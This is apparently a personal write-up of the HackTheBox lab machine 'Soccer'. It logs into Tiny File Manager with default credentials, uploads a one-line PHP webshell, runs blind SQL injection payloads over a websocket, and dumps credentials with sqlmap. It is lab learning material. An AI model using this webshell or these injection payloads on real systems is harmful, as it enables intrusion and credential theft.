# Soccer

Nmap shows open ports: 22, 80 and 9091.

I can't find anything interesting on 9091 for now, so I'll leave it until I think I might need it. Although it looks like a node js app.

Wfuzz doesn't find anything on port 9091 either, but it did find /tiny on port 80:

```
000018127:   301        7 L      12 W       178 Ch      "tiny"                                   
```

I visit http://soccer.htb/tiny. It seems to be a file manager written in PHP according to the docs on github.

I try running sqlmap on the login form, but sqlmap doesn't find injections here. Went on the Tiny docs to browse around and stubled upon default credentials: admin:admin@123, and voila! that gave me admin access!

I can see files related to the website as well as to the file manager, and in the bottom right corner I can see which version was running:

Tiny File Manager 2.4.3

A quick google for "Tiny File Manager 2.4.3" and gitub pulls through with a POC: https://github.com/febinrev/tinyfilemanager-2.4.3-exploit/blob/main/exploit.sh

Looks like I can append &upload to the url and upload something to the server.

http://soccer.htb/tiny/tinyfilemanager.php?p=tiny%2Fuploads&upload

I thought I'd try with a reverse shell first:

```
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
```

And connection established! Let's see who we can pivot to:

```
www-data@soccer:/tmp/nscp$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
player:x:1001:1001::/home/player:/bin/bash
```

Looks like user `player` is the next target! Time for some privilege escalation!



```
tcp        0      0 0.0.0.0:9091            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1105/nginx: worker  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      1105/nginx: worker  
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
```

nginx config:
server {
        listen 80;
        listen [::]:80;
        server_name soc-player.soccer.htb;
        ...
}


subdomain soc-player.soccer.htb

sqlmap? not at default level anyway

nothing for registering either - default values

something about websockets with the /check endpoint

can kind of sql inject:

```
{"id":"83132 and true and false; -- -"}
```

But what does that give me? blind sqli with no feedback???A

I guess since it can only return a boolean statement, I should be able to make a statement on the right-hand side and get a response saying it's true or not - as long as I use an id that exists int he left side.

Still not sure how this can be exploited as it seems I would have to make some crazy guesses about th e.

It seems there are ways to run sqli tests with sqlmap, but you need to set up a proxy to convert between websocket and http - doesn't sound like something you'd do for an easy box.

But I don't know what the point of that would be either - I have already confirmed that there is an injection. I just don't know what I can gain from exploiting it yet.

# After some consideration and pondering

I will continue with enumeration. Am using these payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-blind

I already know it's mysql from the netstat -tulpn output.

Getting version number with query:

```
85511 and substring(version(),1,1)=8
```

Version: 80 (assuming it's 8.0)

Current table columns:

```
93775 order by 1,2,3
```

Adding a fourth order by fails

```
80045 and substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) >= 'a'
```

Spells `accounts`, so I guess that's the name of the table. How handy. I wonder if I can enumerate the columns too:

```
88451 and substring((select column_name from information_schema.columns where table_name='accounts' limit 0,1), 1, 1) >= 'u'
```

This query returns TRUE until I hit `v`, which means the last character is `u`. Most likely the full column name is `username` or `user`, but let's finish the enumeration with the same logic while trying new characters and incrementing the substring counter at the same time.

```
user (fails with n at position 5)
No other columns it looks like
```

Column number two:

```
83639 and substring((select column_name from information_schema.columns where table_name='accounts' limit 1,1), 1,1) >= 'a' ...
```

And so on... It became very tedious, so I wrote a python script to do the enumeration for me. It's not exactly pretty, but it's good enough to get the job done. See `soc.py` for the full script.

In the end, this is what I came up with: there is only one table called `accounts` and it has the following columns:

```
['user', 'host', 'current_connections', 'total_connections', 'max_session_controlled_memory', 'max_session_total_memory', 'id', 'email', 'username', 'password']
```

Among these, I'd say that `username` and `password` are the most interesting ones!

Let's write an injection query to guess the characters of the username in the first row:

```
123 and substring((select username from accounts limit 0,1), 1, 1) = 'a'
```

Using the same technique as with the soc.py script, I get the following username and password:

```
player:playerofthematch
```

Let's try ssh'ing! I recall this user was in /etc/passwd

No dice. My script does not contain numbers - only letters and punctiation. I'll add numbers as well!

This expands the password to: `playerofthematch2022`. I'll try that one.

... Still not good enough! Access denied.

<time passes>

I spent a bit of time googling, and was 99% sure I had the right password. So I found a writeup, and they had found the password to be PlayerOfTheMatch2022.

My home-brewed script had found the same password, but just all lowercase!

So I googled a bit more about mysql case sensitive string comparisons, and it turns out it sucks. For some reason, 'a' and 'A' compare to the same!? At least the way I'm doing it.

I checked out a few writeups up until this point - and they all just used sqlmap which gives them the username and password without much work other than setting up a proxy.

So, I'll do the same! I am using the script here: https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

, and amending it so that it fits my needs and works with my auth flow already.

# Some time passes

I had to try a few different times since the `--passwords` option for sqlmap could not really deal with clear-text password, I think?

I ended up dumping the database instead:

```
sqlmap -u "http://localhost:8081/?id=1" --dbms=mysql --dump
```

And viewing the dump file gives me the correct password! Progress! This is a gotcha for another time where I have to deal with blind mysql injection!

player:PlayerOftheMatch2022








